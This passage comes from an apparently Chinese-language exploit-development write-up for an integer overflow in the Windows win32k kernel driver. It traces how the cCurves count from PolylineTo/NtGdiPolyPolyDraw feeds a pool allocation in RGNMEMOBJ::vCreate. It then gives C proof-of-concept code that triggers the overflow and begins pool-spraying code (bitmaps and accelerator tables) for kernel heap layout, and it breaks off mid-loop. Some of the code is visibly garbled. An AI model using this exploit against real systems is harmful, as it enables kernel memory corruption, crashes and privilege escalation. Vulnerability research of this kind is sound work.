      *((_DWORD *)this + 2) = 0;
      XDCOBJ::vLock(this, a2);
      return v2;
    }
出乎意料，这个函数的构造其实很简单，根据句柄参数 `HDC a2` 获取该句柄指向的设备上下文 `DC` 对象指针并存储在 `this` 的第 1
个成员变量中（即 `PDC pdc` 成员），以使当前 `DCOBJ` 对象成为目标 `DC` 对象的用户对象。
  * `XEPATHOBJ::XEPATHOBJ`构造函数
        XEPATHOBJ::XEPATHOBJ(HPATH hPath)
    {
      ppath = (PPATH)HmgShareLock((HOBJ) hPath, PATH_TYPE);
      if (ppath != (PATH*) NULL)
      {
          // Load up accelerator values:
          cCurves = ppath->cCurves;
          fl      = ppath->fl;
      }
      return;
    }
此函数首先调用`HmgShareLock`函数并传入`hPath`句柄和`PATH_TYPE`类型对句柄指向的`PATH`对象增加共享计数并返回对象指针，以使当前
`XEPATHOBJ` 对象成为目标 `PATH` 对象的用户对象。之后对`cCurves`赋值，没错，就是前面那个导致了溢出的`cCurves`。
至此，我们揪出了`cCurves`的来源，就是参数`HDC a1`句柄控制的，也就是说，我们只要控制了`HDC a1`句柄，就可以在
`ExAllocatePoolWithTag` 函数进行任意大小的的内存分配。
## 漏洞触发
  * `PolylineTo` 函数
虽然刚刚大言不惭的说了要控制`HDC a1`句柄，但也没那么简单，我们要考虑具体如何操作。这里我们使用`PolylineTo` 函数，该函数用于向 `HDC
hdc` 句柄指向的 `DC` 对象中绘制一条或多条直线：
    BOOL __stdcall PolylineTo(HDC hdc, const POINT *apt, DWORD cpt)
    {
      ......
      return NtGdiPolyPolyDraw(hdc, apt, &cpt, 1, 4);
    }
  * `NtGdiPolyPolyDraw`函数
`PolylineTo` 函数最终调用`NtGdiPolyPolyDraw`系统调用：
> 函数 `NtGdiPolyPolyDraw` 用于绘制一个或多个多边形、折线，也可以绘制由一条或多条直线段、贝塞尔曲线段组成的折线等；其第 4 个参数
> `ccpt` 用于在绘制一系列的多边形或折线时指定多边形或折线的个数，如果绘制的是线条（不管是直线还是贝塞尔曲线）该值都需要设置为 `1`；第 5
> 个参数 `iFunc` 用于指定绘制图形类型，设置为 `4` 表示绘制直线。
    cpt = 0;
    for ( i = 0; ; ++i )
    {
        v13 = cpt;
        if ( i >= ccpt )
        break;
        cpt += *(Dst + i);
    }
    if ( cpt > 0x4E2000 )
        goto LABEL_56;
`NtGdiPolyPolyDraw`函数规定了调用时的线条总数目，不能大于 `0x4E2000`，否则直接返回失败。
    switch ( iFunc )
              {
                case 1:
                  v11 = GrePolyPolygon(hdc, v7, Dst, ccpt, cpt);
                  break;
                case 2:
                  v11 = GrePolyPolyline(hdc, v7, Dst, ccpt, cpt);
                  break;
                case 3:
                  v11 = GrePolyBezier(hdc, v7, ulCount);
                  break;
                case 4:
                  v11 = GrePolylineTo(hdc, v7, ulCount);
                  break;
                case 5:
                  v11 = GrePolyBezierTo(hdc, v7, ulCount);
                  break;
                case 6:
                  v11 = GreCreatePolyPolygonRgnInternal(v7, Dst, ccpt, hdc, cpt);
                  break;
                default:
                  v18 = 0;
                  goto LABEL_47;
根据参数`iFunc`的值进入不同的绘制例程。在`PolylineTo` 函数中，`iFunc`的值为4，那么将会调用`GrePolylineTo`
函数，传入 `GrePolylineTo` 函数的第 3 个参数 `ulCount` 是稍早时赋值的本次需要绘制线条的数目，数值来源于从
`PolylineTo` 函数传入的 `cpt` 变量。
  * `GrePolylineTo` 函数
    DCOBJ::DCOBJ(&v12, a1);
        ......
        EXFORMOBJ::vQuickInit(&v11, &v12, 0x204u);
        v8 = 1;
        PATHSTACKOBJ::PATHSTACKOBJ(&v13, &v12, 1);
        if ( !v14 )
        {
          EngSetLastError(8);
    LABEL_12:
          PATHSTACKOBJ::~PATHSTACKOBJ(&v13);
          v6 = 0;
          goto LABEL_9;
        }
        if ( !EPATHOBJ::bPolyLineTo(&v13, &v11, a2, ulCount) )
          goto LABEL_12;
        v9 = EPATHOBJ::ptfxGetCurrent(&v13, &v10);
        DC::vCurrentPosition(v12, &a2[a3 - 1], v9);
`GrePolylineTo` 函数首先根据 `HDC a1` 参数初始化 `DCOBJ v12` 用户对象，接下来定义了 `PATHSTACKOBJ
v13` 用户对象。函数中调用 `PATHSTACKOBJ::PATHSTACKOBJ` 构造函数对 `v13`
对象进行初始化，并在初始化成功后调用成员函数 `EPATHOBJ::bPolyLineTo` 执行绘制操作。
  * `EPATHOBJ::bPolyLineTo` 函数
    int __thiscall EPATHOBJ::bPolyLineTo(EPATHOBJ *this, struct EXFORMOBJ *a2, struct _POINTL *a3, unsigned int ulCount)
    {
      EPATHOBJ *v4; // esi
      int result; // eax
      int v6; // [esp+4h] [ebp-Ch]
      unsigned int v7; // [esp+8h] [ebp-8h]
      struct _POINTL *v8; // [esp+Ch] [ebp-4h]
      v4 = this;
      if ( !*(this + 2) )
        return 0;
      v6 = 0;
      v8 = a3;
      v7 = ulCount;
      result = EPATHOBJ::addpoints(this, a2, &v6);
      if ( result )
        *(v4 + 1) += ulCount;
      return result;
    }
`EPATHOBJ::bPolyLineTo` 执行具体的从 `DC` 对象的当前位置点到指定点的画线操作，通过调用
`EPATHOBJ::addpoints` 执行将目标的点添加到路径中的具体操作。执行成功后，将参数 `ulCount` 的值增加到成员变量
`cCurves` 中。
现在我们知道控制`PolylineTo(HDC hdc, const POINT *apt, DWORD cpt)`的`cpt`变量就可以在
`ExAllocatePoolWithTag` 函数进行任意大小的的内存分配，但离完整的poc还有点距离，接着构造poc。
## poc构造
因为是32位系统，所以ULONG的值最大为0xFFFFFFFF，而发生溢出时的参数为`NumberOfBytes = 0x28 * (v6 +
1)`，所以我们需要构造`0x28 * (v6 + 1)>0xFFFFFFFF`来实现整数溢出，解不等式可得`v6 > 0x‭6666665‬`
。但是`cCurves`在`RGNMEMOBJ::vCreate` 函数的开始位置调用的 `EPATHOBJ::vCloseAllFigure`
成员函数中会被修改，具体代码如下：
    VOID EPATHOBJ::vCloseAllFigures()
    {
        PPATHREC ppr = ppath->pprfirst;
        while (ppr != (PPATHREC) NULL)
        {
            if (ppr->flags & PD_ENDSUBPATH)
            {
                if (!(ppr->flags & PD_CLOSEFIGURE))
                {
                    ppr->flags |= PD_CLOSEFIGURE;
                    cCurves++;
                }
            }
            ppr = ppr->pprnext;
        }
    }
此函数遍历`PPATHREC`列表，并将所有未处于闭合状态的记录项设置为闭合状态，即将末尾的坐标点和起始的坐标点进行连接，所以会使得`cCurves`的值增加1。也就是说，我们只要达成`v6
>
0x‭6666664‬`就可以造成整数溢出了。但是`NtGdiPolyPolyDraw`系统调用绘制的数量不能超过0x4E2000，否则就会直接返回失败，所以我们需要多次调用来达到溢出。完整代码如下：
    #include 
    #include 
    #include 
    CONST LONG maxCount = 0x6666665;
    CONST LONG maxLimit = 0x4E2000;
    static POINT point[maxCount] = { 0 };
    int main(int argc, char* argv[])
    {
        BOOL ret = FALSE;
        for (LONG i = 0; i  0; i -= min(maxLimit, i))
        {
            ret = PolylineTo(hdc, &point[maxCount - i], min(maxLimit, i));
        }
        EndPath(hdc);           // deactivate the path
        HRGN hRgn = PathToRegion(hdc);
        return 0;
    }
虽然我们预想的很好，但是触发BSOD的几率非常低，因为覆盖后续内存的操作本身不会出错，错误其实是发生在后续释放或取内存的时候，而我们又不能保证后续内存存储的是什么东西，所以触发全靠运气，我在本地试了好多次都没有触发，不过可以借助Windbg来查看，确实是分配了一块0x18大小的内存。
# 漏洞利用
## 内核内存布局
虽然我们的poc触发成功率不高，但它确实破坏了后续堆块的`POOL_HEADER`结构，导致释放内存块时校验`POOL_HEADER`结构，从而触发BSOD。但如果我们提前进行堆布局，使得`RGNMEMOBJ::vCreate`函数分配的内存位于所在内存页的末尾，那么在释放的时候就不会对相邻内存块进行校验，这样虽然依旧进行了OOB，但并不会触发崩溃。
    #include 
    #include 
    #include 
    CONST LONG maxCount = 0x6666667;
    CONST LONG maxLimit = 0x4E2000;
    static POINT point[maxCount] = { 0 };
    CONST LONG maxTimes = 5000;
    CONST LONG tmpTimes = 7000;
    static HBITMAP hbitmap[maxTimes] = { NULL };
    static HACCEL  hacctab[tmpTimes] = { NULL };
    int main(int argc, char* argv[])
    {
        for (LONG i = 0; i < 5000; i++)
        {
            hbitmap[i] = CreateBitmap(0xE34, 0x01, 1, 8, NULL);
        }
        for (LONG i = 0; i < 7000; i++)
        {
            ACCEL acckey[0x0D] = { 0 };
            hacctab[i] = CreateAcceleratorTableA(acckey, 0x0D);
        }
        for (LONG i = 2000; i < 4000; i++)
        {